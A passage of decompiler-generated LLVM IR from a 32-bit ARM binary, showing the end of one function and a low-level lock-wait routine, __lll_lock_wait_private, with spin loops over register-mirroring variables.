  %v2_15140 = inttoptr i32 %v1_15140 to i32*
  %v3_15140 = load i32, i32* %v2_15140, align 4
  store i32 %v3_15140, i32* %r3.global-to-local, align 4
  %v1_15144 = add i32 %v0_1513c, -1168
  store i32 %v1_15144, i32* %r5.global-to-local, align 4
  %v3_15148 = icmp uge i32 %v3_15140, %v1_15144
  store i1 %v3_15148, i1* %cpsr_c.global-to-local, align 1
  %v9_15148 = icmp eq i32 %v3_15140, %v1_15144
  br i1 %v9_15148, label %dec_label_pc_152b0, label %dec_label_pc_15150

dec_label_pc_15150:                               ; preds = %dec_label_pc_15134
  store i32 %v4_15138, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1515c112 = inttoptr i32 %v4_15138 to i32*
  %v2_1515c113 = load i32, i32* %v1_1515c112, align 4
  store i32 %v2_1515c113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15160115 = icmp eq i32 %v2_1515c113, 0
  br i1 %v9_15160115, label %dec_label_pc_15168, label %dec_label_pc_15180

dec_label_pc_15168:                               ; preds = %dec_label_pc_15150, %dec_label_pc_15168.dec_label_pc_1515c_crit_edge
  %v0_15168116 = phi i32 [ %v1_15160.pre, %dec_label_pc_15168.dec_label_pc_1515c_crit_edge ], [ 0, %dec_label_pc_15150 ]
  store i32 %v0_15168116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15178 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15178, label %dec_label_pc_1517c, label %dec_label_pc_15168.dec_label_pc_1515c_crit_edge

dec_label_pc_15168.dec_label_pc_1515c_crit_edge:  ; preds = %dec_label_pc_15168
  %v0_1515c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15160.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1515c = inttoptr i32 %v0_1515c.pre to i32*
  %v2_1515c = load i32, i32* %v1_1515c, align 4
  store i32 %v2_1515c, i32* %r3.global-to-local, align 4
  %v3_15160 = icmp uge i32 %v2_1515c, %v1_15160.pre
  store i1 %v3_15160, i1* %cpsr_c.global-to-local, align 1
  %v9_15160 = icmp eq i32 %v2_1515c, %v1_15160.pre
  br i1 %v9_15160, label %dec_label_pc_15168, label %dec_label_pc_15180

dec_label_pc_1517c:                               ; preds = %dec_label_pc_15168
  %v0_1517c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1517c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15180

dec_label_pc_15180:                               ; preds = %dec_label_pc_15150, %dec_label_pc_15168.dec_label_pc_1515c_crit_edge, %dec_label_pc_1517c
  %v0_15180 = phi i32 [ %v0_1517c, %dec_label_pc_1517c ], [ %v2_1515c113, %dec_label_pc_15150 ], [ %v2_1515c, %dec_label_pc_15168.dec_label_pc_1515c_crit_edge ]
  %v1_15180 = phi i32 [ %v0_1517c, %dec_label_pc_1517c ], [ 0, %dec_label_pc_15150 ], [ %v1_15160.pre, %dec_label_pc_15168.dec_label_pc_1515c_crit_edge ]
  %v3_15180 = icmp uge i32 %v0_15180, %v1_15180
  store i1 %v3_15180, i1* %cpsr_c.global-to-local, align 1
  %v9_15180 = icmp eq i32 %v0_15180, %v1_15180
  br i1 %v9_15180, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_15180
  %v1_15184 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_15184, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_15180, %bb73
  %v1_15188 = xor i1 %v9_15180, true
  call void @__pseudo_cond_branch(i1 %v1_15188, i32 ptrtoint (i32* @global_var_15400.643 to i32))
  %v0_1518c = load i32, i32* %r5.global-to-local, align 4
  %v1_1518c = load i32, i32* %r7.global-to-local, align 4
  %v2_1518c = add i32 %v1_1518c, 8
  %v3_1518c = inttoptr i32 %v2_1518c to i32*
  store i32 %v0_1518c, i32* %v3_1518c, align 4
  br label %dec_label_pc_152b0

dec_label_pc_152b0:                               ; preds = %bb74, %dec_label_pc_15134
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_15194 = load i32, i32* %r8.global-to-local, align 4
  %v2_15194 = add i32 %v0_15194, 152
  %v3_15194 = inttoptr i32 %v2_15194 to i32*
  %v4_15194 = load i32, i32* %v3_15194, align 4
  store i32 %v4_15194, i32* %r2.global-to-local, align 4
  %v1_15198 = add i32 %v4_15194, 4
  %v2_15198 = inttoptr i32 %v1_15198 to i32*
  %v3_15198 = load i32, i32* %v2_15198, align 4
  %v1_1519c = add i32 %v3_15198, 1
  store i32 %v1_1519c, i32* %r3.global-to-local, align 4
  store i32 %v1_1519c, i32* %v2_15198, align 4
  %v0_151a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_151a4 = add i32 %v0_151a4, 108
  %v2_151a4 = inttoptr i32 %v1_151a4 to i32*
  %v3_151a4 = load i32, i32* %v2_151a4, align 4
  store i32 %v3_151a4, i32* %sl.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v1_151ac = sub i32 0, %v3_151a4
  store i32 %v1_151ac, i32* %v2_151a4, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_151c0 = load i32, i32* %r5.global-to-local, align 4
  %v1_151c0 = add i32 %v0_151c0, 104
  store i32 %v1_151c0, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_152b4.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_152b4 = add i32 %v0_151c0, 108
  %v3_152b4 = inttoptr i32 %v2_152b4 to i32*
  store i32 %v0_152b4.pre, i32* %v3_152b4, align 4
  %v0_152b8 = load i32, i32* %r8.global-to-local, align 4
  %v1_152b8 = load i32, i32* %r3.global-to-local, align 4
  %v2_152b8 = add i32 %v1_152b8, %v0_152b8
  %v3_152b8 = inttoptr i32 %v2_152b8 to i32*
  %v4_152b8 = load i32, i32* %v3_152b8, align 4
  store i32 %v4_152b8, i32* %r0.global-to-local, align 4
  %v1_152bc = add i32 %v4_152b8, 4
  %v2_152bc = inttoptr i32 %v1_152bc to i32*
  %v3_152bc = load i32, i32* %v2_152bc, align 4
  %v1_152c0 = add i32 %v3_152bc, -1
  store i32 %v1_152c0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_152c4 = icmp eq i32 %v1_152c0, 0
  store i32 %v1_152c0, i32* %v2_152bc, align 4
  br i1 %v2_152c4, label %dec_label_pc_152d0, label %dec_label_pc_153c0thread-pre-split

dec_label_pc_152d0:                               ; preds = %dec_label_pc_152b0
  %v0_152d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_152d0 = load i32, i32* %r0.global-to-local, align 4
  %v2_152d0 = add i32 %v1_152d0, 8
  %v3_152d0 = inttoptr i32 %v2_152d0 to i32*
  store i32 %v0_152d0, i32* %v3_152d0, align 4
  %v0_152d4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_152d4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_152d8

dec_label_pc_152d8:                               ; preds = %dec_label_pc_15308.dec_label_pc_152d8_crit_edge, %dec_label_pc_152d0
  %v0_152d8 = phi i32 [ %v0_152d8.pre, %dec_label_pc_15308.dec_label_pc_152d8_crit_edge ], [ %v0_152d4, %dec_label_pc_152d0 ]
  %v1_152d8 = inttoptr i32 %v0_152d8 to i32*
  %v2_152d8 = load i32, i32* %v1_152d8, align 4
  store i32 %v2_152d8, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_152d8, i32* %r2.global-to-local, align 4
  %v2_152e4100 = load i32, i32* %v1_152d8, align 4
  store i32 %v2_152e4100, i32* %r3.global-to-local, align 4
  %v3_152e8102 = icmp uge i32 %v2_152e4100, %v2_152d8
  store i1 %v3_152e8102, i1* %cpsr_c.global-to-local, align 1
  %v9_152e8108 = icmp eq i32 %v2_152e4100, %v2_152d8
  br i1 %v9_152e8108, label %dec_label_pc_152f0, label %dec_label_pc_15308

dec_label_pc_152f0:                               ; preds = %dec_label_pc_152d8, %dec_label_pc_152f0.dec_label_pc_152e4_crit_edge
  %v0_152f0109 = phi i32 [ %v1_152e8.pre, %dec_label_pc_152f0.dec_label_pc_152e4_crit_edge ], [ %v2_152d8, %dec_label_pc_152d8 ]
  store i32 %v0_152f0109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15300 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15300, label %dec_label_pc_15304, label %dec_label_pc_152f0.dec_label_pc_152e4_crit_edge

dec_label_pc_152f0.dec_label_pc_152e4_crit_edge:  ; preds = %dec_label_pc_152f0
  %v0_152e4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_152e8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_152e4 = inttoptr i32 %v0_152e4.pre to i32*
  %v2_152e4 = load i32, i32* %v1_152e4, align 4
  store i32 %v2_152e4, i32* %r3.global-to-local, align 4
  %v3_152e8 = icmp uge i32 %v2_152e4, %v1_152e8.pre
  store i1 %v3_152e8, i1* %cpsr_c.global-to-local, align 1
  %v9_152e8 = icmp eq i32 %v2_152e4, %v1_152e8.pre
  br i1 %v9_152e8, label %dec_label_pc_152f0, label %dec_label_pc_15308

dec_label_pc_15304:                               ; preds = %dec_label_pc_152f0
  %v0_15304 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15304, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15308

dec_label_pc_15308:                               ; preds = %dec_label_pc_152d8, %dec_label_pc_152f0.dec_label_pc_152e4_crit_edge, %dec_label_pc_15304
  %v0_15310 = phi i32 [ %v0_15304, %dec_label_pc_15304 ], [ %v2_152e4100, %dec_label_pc_152d8 ], [ %v2_152e4, %dec_label_pc_152f0.dec_label_pc_152e4_crit_edge ]
  %v1_15308 = phi i32 [ %v0_15304, %dec_label_pc_15304 ], [ %v2_152d8, %dec_label_pc_152d8 ], [ %v1_152e8.pre, %dec_label_pc_152f0.dec_label_pc_152e4_crit_edge ]
  %v3_15308 = icmp uge i32 %v0_15310, %v1_15308
  store i1 %v3_15308, i1* %cpsr_c.global-to-local, align 1
  %v9_15308 = icmp eq i32 %v0_15310, %v1_15308
  br i1 %v9_15308, label %dec_label_pc_15310, label %dec_label_pc_15308.dec_label_pc_152d8_crit_edge

dec_label_pc_15308.dec_label_pc_152d8_crit_edge:  ; preds = %dec_label_pc_15308
  %v0_152d8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_152d8

dec_label_pc_15310:                               ; preds = %dec_label_pc_15308
  %v2_15310 = icmp ne i32 %v1_15308, 0
  store i1 %v2_15310, i1* %cpsr_c.global-to-local, align 1
  %v7_15314 = icmp slt i32 %v1_15308, 2
  br i1 %v7_15314, label %dec_label_pc_153c0thread-pre-split, label %dec_label_pc_15318

dec_label_pc_15318:                               ; preds = %dec_label_pc_15310
  %v0_15318 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15318, i32* %r0.global-to-local, align 4
  %v0_1531c = load i32, i32* @r1, align 4
  %v1_1531c = add i32 %v0_1531c, 129
  store i32 %v1_1531c, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_153c0thread-pre-split

dec_label_pc_15334:                               ; preds = %dec_label_pc_153c0thread-pre-split, %dec_label_pc_153bc
  %v0_15334 = phi i32 [ %v3_153bc, %dec_label_pc_153bc ], [ %v0_153c0.pr, %dec_label_pc_153c0thread-pre-split ]
  %v1_15334 = inttoptr i32 %v0_15334 to i32*
  %v2_15334 = load i32, i32* %v1_15334, align 4
  store i32 %v2_15334, i32* %r3.global-to-local, align 4
  %v1_15338 = add i32 %v2_15334, 8
  %v2_15338 = inttoptr i32 %v1_15338 to i32*
  %v3_15338 = load i32, i32* %v2_15338, align 4
  store i32 %v3_15338, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1533c = icmp eq i32 %v3_15338, 0
  br i1 %v2_1533c, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_15334
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_15334, %bb75
  %v2_15344 = xor i1 %v2_1533c, true
  call void @__pseudo_cond_branch(i1 %v2_15344, i32 %v3_15338)
  %v0_15348 = load i32, i32* %r6.global-to-local, align 4
  %v1_15348 = inttoptr i32 %v0_15348 to i32*
  %v2_15348 = load i32, i32* %v1_15348, align 4
  store i32 %v2_15348, i32* %r5.global-to-local, align 4
  %v1_1534c = add i32 %v2_15348, 20
  store i32 %v1_1534c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15350

dec_label_pc_15350:                               ; preds = %dec_label_pc_15384.dec_label_pc_15350_crit_edge, %bb76
  %v0_15354 = phi i32 [ %v0_15354.pre, %dec_label_pc_15384.dec_label_pc_15350_crit_edge ], [ %v1_1534c, %bb76 ]
  %v0_15350 = phi i32 [ %v0_15350.pre, %dec_label_pc_15384.dec_label_pc_15350_crit_edge ], [ %v2_15348, %bb76 ]
  %v1_15350 = add i32 %v0_15350, 20
  %v2_15350 = inttoptr i32 %v1_15350 to i32*
  %v3_15350 = load i32, i32* %v2_15350, align 4
  store i32 %v0_15354, i32* %r2.global-to-local, align 4
  store i32 %v3_15350, i32* %r4.global-to-local, align 4
  %v1_1535c = add i32 %v3_15350, -1
  store i32 %v1_1535c, i32* @r1, align 4
  %v1_1536087 = inttoptr i32 %v0_15354 to i32*
  %v2_1536088 = load i32, i32* %v1_1536087, align 4
  store i32 %v2_1536088, i32* %r3.global-to-local, align 4
  %v3_1536490 = icmp uge i32 %v2_1536088, %v3_15350
  store i1 %v3_1536490, i1* %cpsr_c.global-to-local, align 1
  %v9_1536496 = icmp eq i32 %v2_1536088, %v3_15350
  br i1 %v9_1536496, label %dec_label_pc_1536c, label %dec_label_pc_15384

dec_label_pc_1536c:                               ; preds = %dec_label_pc_15350, %dec_label_pc_1536c.dec_label_pc_15360_crit_edge
  %v0_1536c97 = phi i32 [ %v1_15364.pre, %dec_label_pc_1536c.dec_label_pc_15360_crit_edge ], [ %v3_15350, %dec_label_pc_15350 ]
  store i32 %v0_1536c97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1537c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1537c, label %dec_label_pc_15380, label %dec_label_pc_1536c.dec_label_pc_15360_crit_edge

dec_label_pc_1536c.dec_label_pc_15360_crit_edge:  ; preds = %dec_label_pc_1536c
  %v0_15360.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15364.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15360 = inttoptr i32 %v0_15360.pre to i32*
  %v2_15360 = load i32, i32* %v1_15360, align 4
  store i32 %v2_15360, i32* %r3.global-to-local, align 4
  %v3_15364 = icmp uge i32 %v2_15360, %v1_15364.pre
  store i1 %v3_15364, i1* %cpsr_c.global-to-local, align 1
  %v9_15364 = icmp eq i32 %v2_15360, %v1_15364.pre
  br i1 %v9_15364, label %dec_label_pc_1536c, label %dec_label_pc_15384

dec_label_pc_15380:                               ; preds = %dec_label_pc_1536c
  %v0_15380 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15380, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15384

dec_label_pc_15384:                               ; preds = %dec_label_pc_15350, %dec_label_pc_1536c.dec_label_pc_15360_crit_edge, %dec_label_pc_15380
  %v0_15390 = phi i32 [ %v0_15380, %dec_label_pc_15380 ], [ %v2_1536088, %dec_label_pc_15350 ], [ %v2_15360, %dec_label_pc_1536c.dec_label_pc_15360_crit_edge ]
  %v1_15384 = phi i32 [ %v0_15380, %dec_label_pc_15380 ], [ %v3_15350, %dec_label_pc_15350 ], [ %v1_15364.pre, %dec_label_pc_1536c.dec_label_pc_15360_crit_edge ]
  %v3_15384 = icmp uge i32 %v0_15390, %v1_15384
  store i1 %v3_15384, i1* %cpsr_c.global-to-local, align 1
  %v9_15384 = icmp eq i32 %v0_15390, %v1_15384
  store i32 %v0_15390, i32* %r2.global-to-local, align 4
  br i1 %v9_15384, label %dec_label_pc_15390, label %dec_label_pc_15384.dec_label_pc_15350_crit_edge

dec_label_pc_15384.dec_label_pc_15350_crit_edge:  ; preds = %dec_label_pc_15384
  %v0_15350.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_15354.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15350

dec_label_pc_15390:                               ; preds = %dec_label_pc_15384
  %v2_15390 = icmp ne i32 %v1_15384, 0
  store i1 %v2_15390, i1* %cpsr_c.global-to-local, align 1
  %v7_15390 = icmp eq i32 %v1_15384, 1
  %v0_15398 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_15390, label %dec_label_pc_15398, label %dec_label_pc_153bc

dec_label_pc_15398:                               ; preds = %dec_label_pc_15390
  %v1_15398 = inttoptr i32 %v0_15398 to i32*
  %v2_15398 = load i32, i32* %v1_15398, align 4
  store i32 %v2_15398, i32* @r1, align 4
  %v1_1539c = add i32 %v2_15398, 24
  %v2_1539c = inttoptr i32 %v1_1539c to i32*
  %v3_1539c = load i32, i32* %v2_1539c, align 4
  store i32 %v3_1539c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_153a0 = icmp eq i32 %v3_1539c, 0
  br i1 %v2_153a0, label %dec_label_pc_153bc, label %dec_label_pc_153a8

dec_label_pc_153a8:                               ; preds = %dec_label_pc_15398
  %v1_153a8 = add i32 %v2_15398, 20
  %v2_153a8 = inttoptr i32 %v1_153a8 to i32*
  %v3_153a8 = load i32, i32* %v2_153a8, align 4
  store i32 %v3_153a8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_153bc

dec_label_pc_153bc:                               ; preds = %dec_label_pc_15390, %dec_label_pc_153a8, %dec_label_pc_15398
  %v1_153bc = add i32 %v0_15398, 4
  %v2_153bc = inttoptr i32 %v1_153bc to i32*
  %v3_153bc = load i32, i32* %v2_153bc, align 4
  store i32 %v3_153bc, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_153c0 = icmp eq i32 %v3_153bc, 0
  br i1 %v2_153c0, label %dec_label_pc_153c8, label %dec_label_pc_15334

dec_label_pc_153c0thread-pre-split:               ; preds = %dec_label_pc_15318, %dec_label_pc_15310, %dec_label_pc_152b0
  %v0_153c0.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_153c011 = icmp eq i32 %v0_153c0.pr, 0
  br i1 %v2_153c011, label %dec_label_pc_153c8, label %dec_label_pc_15334

dec_label_pc_153c8:                               ; preds = %dec_label_pc_153bc, %dec_label_pc_153c0thread-pre-split
  %v0_153c8.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_153c8.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_153c8.pre

; uselistorder directives
  uselistorder i32 %v0_153c0.pr, { 1, 0 }
  uselistorder i32 %v3_153bc, { 1, 2, 0 }
  uselistorder i32 %v1_15384, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15380, { 1, 0, 2 }
  uselistorder i32 %v1_15364.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15304, { 1, 0, 2 }
  uselistorder i32 %v1_152e8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_152d8, { 1, 0 }
  uselistorder i32 %v0_1517c, { 1, 0, 2 }
  uselistorder i32 %v1_15160.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_15138, { 2, 1, 0, 3 }
  uselistorder i32 %v0_15110, { 1, 0, 2 }
  uselistorder i32 %v1_150f4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_150bc, { 1, 0, 2 }
  uselistorder i32 %v0_1509c, { 1, 0, 2 }
  uselistorder i32 %v1_15080.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 14, 13, 0 }
  uselistorder i32* %r6.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 9, 10, 12, 11, 13, 14, 16, 15, 17 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 4, 3, 30, 5, 6, 7, 8, 10, 9, 31, 11, 12, 13, 14, 15, 16, 17, 19, 18, 32, 20, 21, 22, 24, 23, 33, 25, 26, 28, 27, 34, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 7, 2, 3, 4, 5, 23, 24, 6, 8, 9, 10, 25, 26, 11, 12, 13, 27, 28, 14, 15, 16, 29, 30, 17, 18, 19, 20, 31, 32, 22, 21, 1 }
  uselistorder i32 108, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_153c8, { 1, 0 }
  uselistorder label %dec_label_pc_153bc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15384, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1536c, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_15308, { 2, 1, 0 }
  uselistorder label %dec_label_pc_152f0, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_15180, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15168, { 1, 0 }
  uselistorder label %dec_label_pc_15114, { 2, 1, 0 }
  uselistorder label %dec_label_pc_150fc, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_150a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15088, { 1, 0 }
  uselistorder label %dec_label_pc_15124.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_15054, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15400 = load i32, i32* @r4, align 4
  store i32 %v3_15400, i32* %stack_var_-16, align 4
  %v0_15404 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15404, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15408

dec_label_pc_15408:                               ; preds = %dec_label_pc_15488.dec_label_pc_15408_crit_edge, %entry
  %v0_1540c = phi i32 [ %v0_1540c.pre, %dec_label_pc_15488.dec_label_pc_15408_crit_edge ], [ %v0_15404, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_1540c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_1541417 = inttoptr i32 %v0_1540c to i32*
  %v2_1541418 = load i32, i32* %v1_1541417, align 4
  %v3_1541820 = icmp ne i32 %v2_1541418, 0
  store i1 %v3_1541820, i1* %cpsr_c.global-to-local, align 1
  %v9_1541826 = icmp eq i32 %v2_1541418, 1
  br i1 %v9_1541826, label %dec_label_pc_15420, label %dec_label_pc_15438

dec_label_pc_15420:                               ; preds = %dec_label_pc_15408, %dec_label_pc_15420.dec_label_pc_15414_crit_edge
  %v0_1542027 = phi i32 [ %v1_15418.pre, %dec_label_pc_15420.dec_label_pc_15414_crit_edge ], [ 1, %dec_label_pc_15408 ]
  store i32 %v0_1542027, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15430 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15430, label %dec_label_pc_15434, label %dec_label_pc_15420.dec_label_pc_15414_crit_edge

dec_label_pc_15420.dec_label_pc_15414_crit_edge:  ; preds = %dec_label_pc_15420
  %v0_15414.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15418.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15414 = inttoptr i32 %v0_15414.pre to i32*
  %v2_15414 = load i32, i32* %v1_15414, align 4
  %v3_15418 = icmp uge i32 %v2_15414, %v1_15418.pre
  store i1 %v3_15418, i1* %cpsr_c.global-to-local, align 1
  %v9_15418 = icmp eq i32 %v2_15414, %v1_15418.pre
  br i1 %v9_15418, label %dec_label_pc_15420, label %dec_label_pc_15438

dec_label_pc_15434:                               ; preds = %dec_label_pc_15420
  %v0_15434 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15438

dec_label_pc_15438:                               ; preds = %dec_label_pc_15408, %dec_label_pc_15420.dec_label_pc_15414_crit_edge, %dec_label_pc_15434
  %v0_15438 = phi i32 [ %v0_15434, %dec_label_pc_15434 ], [ %v2_1541418, %dec_label_pc_15408 ], [ %v2_15414, %dec_label_pc_15420.dec_label_pc_15414_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15438 = icmp eq i32 %v0_15438, 0
  %v0_1545c.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_15438, label %dec_label_pc_15458, label %dec_label_pc_15440

dec_label_pc_15440:                               ; preds = %dec_label_pc_15438
  store i32 %v0_1545c.pre, i32* %r0.global-to-local, align 4
  %v0_15444 = load i32, i32* %r1.global-to-local, align 4
  %v1_15444 = add i32 %v0_15444, 126
  store i32 %v1_15444, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15458

dec_label_pc_15458:                               ; preds = %dec_label_pc_15438, %dec_label_pc_15440
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_1545c.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1546428 = inttoptr i32 %v0_1545c.pre to i32*
  %v2_1546429 = load i32, i32* %v1_1546428, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1546836 = icmp eq i32 %v2_1546429, 0
  br i1 %v9_1546836, label %dec_label_pc_15470, label %dec_label_pc_15488

dec_label_pc_15470:                               ; preds = %dec_label_pc_15458, %dec_label_pc_15470.dec_label_pc_15464_crit_edge
  %v0_1547037 = phi i32 [ %v1_15468.pre, %dec_label_pc_15470.dec_label_pc_15464_crit_edge ], [ 0, %dec_label_pc_15458 ]
  store i32 %v0_1547037, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15480 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15480, label %dec_label_pc_15484, label %dec_label_pc_15470.dec_label_pc_15464_crit_edge

dec_label_pc_15470.dec_label_pc_15464_crit_edge:  ; preds = %dec_label_pc_15470
  %v0_15464.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15468.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15464 = inttoptr i32 %v0_15464.pre to i32*
  %v2_15464 = load i32, i32* %v1_15464, align 4
  %v3_15468 = icmp uge i32 %v2_15464, %v1_15468.pre
  store i1 %v3_15468, i1* %cpsr_c.global-to-local, align 1
  %v9_15468 = icmp eq i32 %v2_15464, %v1_15468.pre
  br i1 %v9_15468, label %dec_label_pc_15470, label %dec_label_pc_15488

dec_label_pc_15484:                               ; preds = %dec_label_pc_15470
  %v0_15484 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15488

dec_label_pc_15488:                               ; preds = %dec_label_pc_15458, %dec_label_pc_15470.dec_label_pc_15464_crit_edge, %dec_label_pc_15484
  %v0_15488 = phi i32 [ %v0_15484, %dec_label_pc_15484 ], [ %v2_1546429, %dec_label_pc_15458 ], [ %v2_15464, %dec_label_pc_15470.dec_label_pc_15464_crit_edge ]
  %v1_15488 = phi i32 [ %v0_15484, %dec_label_pc_15484 ], [ 0, %dec_label_pc_15458 ], [ %v1_15468.pre, %dec_label_pc_15470.dec_label_pc_15464_crit_edge ]
  %v3_15488 = icmp uge i32 %v0_15488, %v1_15488
  store i1 %v3_15488, i1* %cpsr_c.global-to-local, align 1
  %v9_15488 = icmp eq i32 %v0_15488, %v1_15488
  br i1 %v9_15488, label %dec_label_pc_15490, label %dec_label_pc_15488.dec_label_pc_15408_crit_edge

dec_label_pc_15488.dec_label_pc_15408_crit_edge:  ; preds = %dec_label_pc_15488
  %v0_1540c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15408

dec_label_pc_15490:                               ; preds = %dec_label_pc_15488
  %v2_15490 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15490, i32* %r4.global-to-local, align 4
  %v1_15494 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_15494

; uselistorder directives
